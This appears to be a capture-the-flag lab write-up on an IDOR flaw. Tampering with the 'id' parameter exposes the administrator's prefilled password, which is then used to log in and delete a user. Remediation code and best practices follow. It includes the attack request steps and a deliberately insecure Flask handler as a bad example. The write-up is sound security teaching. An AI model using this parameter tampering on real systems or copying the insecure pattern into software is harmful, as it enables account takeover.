# User ID Controlled by Request Parameter with Password Disclosure

**Difficulty:** `APPRENTICE` | **Category:** `Access Control`

---

## 🎯 Lab Goal

Retrieve the administrator's password through IDOR vulnerability, log in as admin, and delete user "carlos".

---

## 📋 Lab Description

The lab leaks the current user's password in a masked input field on the account page, combined with an IDOR vulnerability.

---

## 🔎 Reconnaissance

### Initial Access

Logged in with provided credentials:

| Field | Value |
|-------|-------|
| Username | `wiener` |
| Password | `peter` |

### Account Page Analysis

Intercepted the request to account page in Burp Suite:

```http
GET /my-account?id=wiener HTTP/1.1
```

---

## 🧪 Testing & Exploitation

### Step 1: Identify IDOR Vulnerability

Original request:
```http
GET /my-account?id=wiener
```

🔍 **Vulnerability:** User ID parameter is not validated for authorization.

### Step 2: Access Administrator Account

Modified the request to target administrator:

**Original:**
```http
GET /my-account?id=wiener
```

**Modified:**
```http
GET /my-account?id=administrator
```

### Step 3: Extract Password from Response

The response HTML included a **prefilled password field**:

```html
<input required type="password" name="password" value="au4t1huan8gt29fmfiqg"/>
```

🔑 **Administrator Password:** `au4t1huan8gt29fmfiqg`

### Step 4: Admin Login

Logged in with extracted credentials:

| Field | Value |
|-------|-------|
| Username | `administrator` |
| Password | `au4t1huan8gt29fmfiqg` |

### Step 5: Delete User

Accessed admin panel and successfully deleted user "carlos".

---

## 🚩 Solution

**Exploit Request:**
```http
GET /my-account?id=administrator
```

**Leaked Password:** `au4t1huan8gt29fmfiqg`

---

## 💡 Key Takeaways

### Multiple Vulnerabilities Combined

This lab demonstrates **two critical vulnerabilities**:

1. **IDOR (Insecure Direct Object Reference)**
   - No authorization check on user ID parameter
   - Can access any user's account page

2. **Sensitive Data Exposure**
   - Password stored in plaintext in HTML
   - Visible in page source even if masked in UI

### Password Exposure Patterns

Common ways passwords leak in applications:

| Method | Example | Risk |
|--------|---------|------|
| Prefilled forms | `value="password123"` | Critical |
| JavaScript variables | `var pwd = "secret"` | High |
| HTML comments | `<!-- pass: admin -->` | High |
| Error messages | `Invalid password: abc123` | Medium |
| API responses | `{"password": "secret"}` | Critical |

---

## 🛡️ Remediation

### Fix IDOR Vulnerability

**❌ Bad (No Authorization):**
```python
@app.route('/my-account')
def account():
    user_id = request.args.get('id')
    user = User.query.filter_by(username=user_id).first()
    return render_template('account.html', user=user)
```

**✅ Good (With Authorization):**
```python
@app.route('/my-account')
@login_required
def account():
    requested_user = request.args.get('id')
    current_user = session['username']
    
    if requested_user != current_user:
        abort(403)
    
    user = User.query.filter_by(username=current_user).first()
    return render_template('account.html', user=user)
```

### Fix Password Exposure

**❌ Bad (Password in HTML):**
```html
<input type="password" name="password" value="{{ user.password }}">
```

**✅ Good (Never Send Password to Client):**
```html
<!-- Password change form -->
<input type="password" name="current_password" placeholder="Current Password">
<input type="password" name="new_password" placeholder="New Password">
<input type="password" name="confirm_password" placeholder="Confirm New Password">
```

### Best Practices

#### Access Control
- ✅ **Validate ownership** on every request
- ✅ **Use session-based access** instead of parameters
- ✅ **Implement proper RBAC**
- ✅ **Log unauthorized access attempts**

#### Password Security
- ✅ **Never send passwords to client** (even hashed)
- ✅ **Use password change flows** requiring current password
- ✅ **Store passwords with strong hashing** (bcrypt, Argon2)
- ✅ **Never log passwords**
- ✅ **Implement password complexity requirements**

#### Secure Password Change Flow

```python
@app.route('/change-password', methods=['POST'])
@login_required
def change_password():
    current = request.form.get('current_password')
    new = request.form.get('new_password')
    
    user = User.query.get(session['user_id'])
    
    # Verify current password
    if not user.verify_password(current):
        return "Invalid current password", 403
    
    # Update to new password (hashed)
    user.set_password(new)
    db.session.commit()
    
    return "Password updated successfully"
```

### Security Headers

```python
# Never cache pages with sensitive data
@app.after_request
def set_headers(response):
    response.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate'
    response.headers['Pragma'] = 'no-cache'
    response.headers['X-Content-Type-Options'] = 'nosniff'
    return response
```

---

**Status:** ✅ Solved
